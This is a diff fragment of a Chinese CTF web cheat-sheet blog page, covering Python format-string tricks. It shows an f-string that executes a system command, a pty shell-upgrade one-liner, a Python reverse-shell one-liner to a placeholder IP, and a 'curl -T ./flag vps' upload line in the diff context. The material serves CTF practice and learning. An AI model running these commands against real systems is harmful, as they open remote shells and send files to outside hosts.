+<h4 id="84-python-格式化字符串"><a href="#84-python-格式化字符串" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>8.4 python-格式化字符串</h4>
+<p>1.%操作符</p>
+<p>2.string.Template</p>
+<p>3.调用format方法</p>
+<p>4.f-Strings (执行代码)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">5</span> <span class="p">,</span> <span class="mi">10</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">f</span><span class="s1">&#39;Five plus ten is {a + b} and not {2 * (a + b)}.&#39;</span>
+<span class="s1">&#39;Five plus ten is 15 and not 30.&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">f</span><span class="s1">&#39;{__import__(&#34;os&#34;).system(&#34;id&#34;)}&#39;</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="s1">&#39;0&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://xz.aliyun.com/t/3569#toc-1" target="_blank" rel="noopener">Python格式化字符串问题</a></p>
+<h4 id="85-python-一些其他trick"><a href="#85-python-一些其他trick" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>8.5 python-一些其他trick</h4>
+<p>完全交互式shell:</p>
+<p><code>python -c &quot;import pty;pty.spawn('/bin/bash');&quot;</code></p>
+<p>反弹shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;ip&#34;,4433));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
+</code></pre></td></tr></table>
+</div>
 </div></div>
 
         </article>
@@ -1030,7 +1463,7 @@ curl -T ./flag vps
 
 
         
-    <div class="updated-badge-container"><div title="Updated @ 2020-03-18 18:19:42 CST" style="cursor:help;display:inline-block">
+    <div class="updated-badge-container"><div title="Updated @ 2020-03-18 21:35:37 CST" style="cursor:help;display:inline-block">
 
 <svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2020-03-18</text><text x="915" y="140" textLength="650" transform="scale(.1)">2020-03-18</text></g></svg></div></div>
 
@@ -1067,7 +1500,7 @@ curl -T ./flag vps
                 
                 <div class="share-item linkedin">
                     
-                    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://ajatars.github.io/posts/ctf-web/&amp;title=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;summary=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e5%91%bd%e5%90%8d%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6&amp;source=Ajatar" title="分享到「LinkedIn」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon linkedin-icon"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg></a>
+                    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://ajatars.github.io/posts/ctf-web/&amp;title=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;summary=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e7%9b%b8%e5%85%b3%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6&amp;source=Ajatar" title="分享到「LinkedIn」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon linkedin-icon"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg></a>
                 </div>
             
 
@@ -1091,7 +1524,7 @@ curl -T ./flag vps
                 
                 <div class="share-item douban">
                     
-                    <a href="https://www.douban.com/share/service?href=https://ajatars.github.io/posts/ctf-web/&amp;name=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;text=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e5%91%bd%e5%90%8d%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6" title="分享到「豆瓣」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon douban-icon"><path d="M.643.92v2.412h22.714V.92H.643zm1.974 4.926v9.42h18.764v-9.42H2.617zm2.72 2.408H18.69v4.605H5.338V8.254zm1.657 7.412l-2.512.938c1.037 1.461 1.87 2.825 2.512 4.091H0v2.385h24v-2.385h-6.678c.818-1.176 1.589-2.543 2.303-4.091l-2.73-.938a29.952 29.952 0 01-2.479 5.03h-4.75c-.786-1.962-1.677-3.641-2.672-5.03Z"/></svg></a>
+                    <a href="https://www.douban.com/share/service?href=https://ajatars.github.io/posts/ctf-web/&amp;name=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;text=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e7%9b%b8%e5%85%b3%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6" title="分享到「豆瓣」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon douban-icon"><path d="M.643.92v2.412h22.714V.92H.643zm1.974 4.926v9.42h18.764v-9.42H2.617zm2.72 2.408H18.69v4.605H5.338V8.254zm1.657 7.412l-2.512.938c1.037 1.461 1.87 2.825 2.512 4.091H0v2.385h24v-2.385h-6.678c.818-1.176 1.589-2.543 2.303-4.091l-2.73-.938a29.952 29.952 0 01-2.479 5.03h-4.75c-.786-1.962-1.677-3.641-2.672-5.03Z"/></svg></a>
                 </div>
             
 
@@ -1099,7 +1532,7 @@ curl -T ./flag vps
                 
                 <div class="share-item qq">
                     
-                    <a href="https://connect.qq.com/widget/shareqq/index.html?url=https://ajatars.github.io/posts/ctf-web/&amp;title=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;summary=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e5%91%bd%e5%90%8d%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6&amp;pics=https://ajatars.github.io/icons/apple-touch-icon.png&amp;site=Ajatar" title="分享到「QQ」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon qq-icon"><path d="M433.754 420.445c-11.526 1.393-44.86-52.741-44.86-52.741 0 31.345-16.136 72.247-51.051 101.786 16.842 5.192 54.843 19.167 45.803 34.421-7.316 12.343-125.51 7.881-159.632 4.037-34.122 3.844-152.316 8.306-159.632-4.037-9.045-15.25 28.918-29.214 45.783-34.415-34.92-29.539-51.059-70.445-51.059-101.792 0 0-33.334 54.134-44.859 52.741-5.37-.65-12.424-29.644 9.347-99.704 10.261-33.024 21.995-60.478 40.144-105.779C60.683 98.063 108.982.006 224 0c113.737.006 163.156 96.133 160.264 214.963 18.118 45.223 29.912 72.85 40.144 105.778 21.768 70.06 14.716 99.053 9.346 99.704z"/></svg></a>
+                    <a href="https://connect.qq.com/widget/shareqq/index.html?url=https://ajatars.github.io/posts/ctf-web/&amp;title=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;summary=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e7%9b%b8%e5%85%b3%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6&amp;pics=https://ajatars.github.io/icons/apple-touch-icon.png&amp;site=Ajatar" title="分享到「QQ」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon qq-icon"><path d="M433.754 420.445c-11.526 1.393-44.86-52.741-44.86-52.741 0 31.345-16.136 72.247-51.051 101.786 16.842 5.192 54.843 19.167 45.803 34.421-7.316 12.343-125.51 7.881-159.632 4.037-34.122 3.844-152.316 8.306-159.632-4.037-9.045-15.25 28.918-29.214 45.783-34.415-34.92-29.539-51.059-70.445-51.059-101.792 0 0-33.334 54.134-44.859 52.741-5.37-.65-12.424-29.644 9.347-99.704 10.261-33.024 21.995-60.478 40.144-105.779C60.683 98.063 108.982.006 224 0c113.737.006 163.156 96.133 160.264 214.963 18.118 45.223 29.912 72.85 40.144 105.778 21.768 70.06 14.716 99.053 9.346 99.704z"/></svg></a>
                 </div>
             
 
@@ -1107,7 +1540,7 @@ curl -T ./flag vps
                 
                 <div class="share-item qzone">
                     
-                    <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://ajatars.github.io/posts/ctf-web/&amp;title=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;summary=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e5%91%bd%e5%90%8d%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6&amp;pics=https://ajatars.github.io/icons/apple-touch-icon.png&amp;site=Ajatar" title="分享到「QQ 空间」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon qzone-icon"><path d="M23.985 9.202c-.032-.099-.127-.223-.334-.258-.207-.036-7.351-1.406-7.351-1.406s-.105-.022-.198-.07c-.092-.047-.127-.167-.127-.167S12.447.956 12.349.77C12.25.583 12.104.532 12 .532c-.104 0-.251.051-.349.238-.098.186-3.626 6.531-3.626 6.531s-.035.12-.128.167c-.092.047-.197.07-.197.07S.556 8.908.348 8.943c-.208.036-.302.16-.333.258a.477.477 0 0 0 .125.449l5.362 5.49s.072.08.119.172c.016.104.005.21.005.21s-1.189 7.242-1.22 7.45.075.369.159.43c.083.062.233.106.421.013.189-.093 6.812-3.261 6.812-3.261s.098-.044.201-.061c.103-.017.201.061.201.061s6.623 3.168 6.812 3.261c.188.094.338.049.421-.013a.463.463 0 0 0 .159-.43c-.021-.14-.93-5.677-.93-5.677.876-.54 1.425-1.039 1.849-1.747-2.594.969-6.006 1.717-9.415 1.866-.915.041-2.41.097-3.473-.015-.678-.071-1.17-.144-1.243-.438-.053-.215.054-.46.545-.831a2640.5 2640.5 0 0 1 2.861-2.155c1.285-.968 3.559-2.47 3.559-2.731 0-.285-2.144-.781-4.037-.781-1.945 0-2.275.132-2.811.168-.488.034-.769.005-.804-.138-.06-.248.183-.389.588-.568.709-.314 1.86-.594 1.984-.626.194-.052 3.082-.805 5.618-.535 1.318.14 3.244.668 3.244 1.276 0 .342-1.721 1.494-3.225 2.597-1.149.843-2.217 1.561-2.217 1.688 0 .342 3.533 1.241 6.689 1.01l.003-.022c.048-.092.119-.172.119-.172l5.362-5.49a.477.477 0 0 0 .127-.449z"/></svg></a>
+                    <a href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://ajatars.github.io/posts/ctf-web/&amp;title=CTF%20Web%20%e5%a4%87%e5%bf%98%e5%bd%95%ef%bc%88%e7%bb%ad%e6%9b%b4%ef%bc%89&amp;summary=%e2%80%8b%20CTF%20web%e7%9a%84%e4%b8%80%e4%ba%9b%e6%80%bb%e7%bb%93%e4%b8%8e%e5%a4%87%e5%bf%98%e3%80%82%201.PHP%e7%9b%b8%e5%85%b3%201.1%20%e5%8f%98%e9%87%8f%e8%a6%86%e7%9b%96%201.2%20%e5%8f%98%e9%87%8f%e7%9b%b8%e5%85%b3%201.3%20php%e4%bc%aa%e5%8d%8f%e8%ae%ae%201.4%20php%e2%80%a6%e2%80%a6&amp;pics=https://ajatars.github.io/icons/apple-touch-icon.png&amp;site=Ajatar" title="分享到「QQ 空间」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon qzone-icon"><path d="M23.985 9.202c-.032-.099-.127-.223-.334-.258-.207-.036-7.351-1.406-7.351-1.406s-.105-.022-.198-.07c-.092-.047-.127-.167-.127-.167S12.447.956 12.349.77C12.25.583 12.104.532 12 .532c-.104 0-.251.051-.349.238-.098.186-3.626 6.531-3.626 6.531s-.035.12-.128.167c-.092.047-.197.07-.197.07S.556 8.908.348 8.943c-.208.036-.302.16-.333.258a.477.477 0 0 0 .125.449l5.362 5.49s.072.08.119.172c.016.104.005.21.005.21s-1.189 7.242-1.22 7.45.075.369.159.43c.083.062.233.106.421.013.189-.093 6.812-3.261 6.812-3.261s.098-.044.201-.061c.103-.017.201.061.201.061s6.623 3.168 6.812 3.261c.188.094.338.049.421-.013a.463.463 0 0 0 .159-.43c-.021-.14-.93-5.677-.93-5.677.876-.54 1.425-1.039 1.849-1.747-2.594.969-6.006 1.717-9.415 1.866-.915.041-2.41.097-3.473-.015-.678-.071-1.17-.144-1.243-.438-.053-.215.054-.46.545-.831a2640.5 2640.5 0 0 1 2.861-2.155c1.285-.968 3.559-2.47 3.559-2.731 0-.285-2.144-.781-4.037-.781-1.945 0-2.275.132-2.811.168-.488.034-.769.005-.804-.138-.06-.248.183-.389.588-.568.709-.314 1.86-.594 1.984-.626.194-.052 3.082-.805 5.618-.535 1.318.14 3.244.668 3.244 1.276 0 .342-1.721 1.494-3.225 2.597-1.149.843-2.217 1.561-2.217 1.688 0 .342 3.533 1.241 6.689 1.01l.003-.022c.048-.092.119-.172.119-.172l5.362-5.49a.477.477 0 0 0 .127-.449z"/></svg></a>
                 </div>
             
 
